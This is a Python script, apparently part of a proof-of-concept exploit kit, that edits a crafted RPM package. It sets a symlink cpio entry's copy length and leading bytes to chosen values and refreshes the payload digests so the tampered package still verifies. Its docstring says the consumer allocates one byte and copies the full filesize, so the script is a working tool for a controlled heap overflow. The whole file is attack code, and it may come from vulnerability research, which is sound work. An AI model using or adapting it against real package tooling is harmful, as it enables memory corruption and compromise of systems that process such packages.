#!/usr/bin/env python3
"""Patch the cpio filesize and leading data bytes of an existing crafted RPM.

The RPM header already carries RPMTAG_LONGFILESIZES = UINT64_MAX, so the
real consumer allocates one byte and copies `filesize` bytes from the cpio
entry. Keeping the archive length fixed means only the payload digests need
refreshing; this isolates copy length and leading chosen bytes.
"""
import hashlib
import importlib.util
import struct
import sys
from pathlib import Path

spec = importlib.util.spec_from_file_location(
    "make_attack", str(Path(__file__).resolve().parent.parent / "make-attack.py"))
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)


def refresh(blob, entries, data, data_size, payload):
    for tag in (5092, 5097, 5121, 5122, 5123, 5124):
        kind, off, count = entries[tag]
        old = m.string_at(blob, data + off, data + data_size)
        digest = {
            5092: hashlib.sha256(payload).hexdigest(),
            5097: hashlib.sha256(payload).hexdigest(),
            5121: hashlib.sha512(payload).hexdigest(),
            5122: hashlib.sha512(payload).hexdigest(),
            5123: hashlib.sha3_256(payload).hexdigest(),
            5124: hashlib.sha3_256(payload).hexdigest(),
        }[tag]
        if kind not in (m.TYPE_STRING, m.TYPE_STRING_ARRAY) or count != 1:
            raise ValueError(f"unexpected digest tag {tag}")
        if len(old) != len(digest):
            raise ValueError(f"digest length changed for tag {tag}")
        blob[data + off:data + off + len(digest)] = digest.encode()


def main():
    src, dst, n_text, hex_text = sys.argv[1:5]
    n = int(n_text)
    chosen = bytes.fromhex(hex_text)
    if len(chosen) != n:
        raise ValueError("chosen byte count must equal copy length")
    blob = bytearray(Path(src).read_bytes())
    _, _, _, sig_end = m.header_at(blob, 96)
    main_at = (sig_end + 7) & ~7
    entries, data, data_size, payload_at = m.header_at(blob, main_at)
    sizes = struct.unpack_from(f">{entries[5008][2]}q", blob,
                               data + entries[5008][1])
    offset = payload_at
    hit = None
    while True:
        name, file_size, data_start, data_end, nxt = m.cpio_entry(
            blob, offset, sizes)
        if name == "TRAILER!!!":
            break
        if name.endswith("/linkme") and file_size == 64:
            hit = (offset, data_start, data_end)
        offset = nxt
    if hit is None:
        raise ValueError("64-byte symlink cpio entry not found")
    entry_at, data_start, data_end = hit
    blob[entry_at + 54:entry_at + 62] = f"{n:08x}".encode()
    blob[data_start:data_start + n] = chosen
    refresh(blob, entries, data, data_size, bytes(blob[payload_at:]))
    Path(dst).write_bytes(blob)
    print(f"copylen={n} chosen={chosen.hex()} entry={entry_at:#x} "
          f"data={data_start:#x}")


if __name__ == "__main__":
    main()
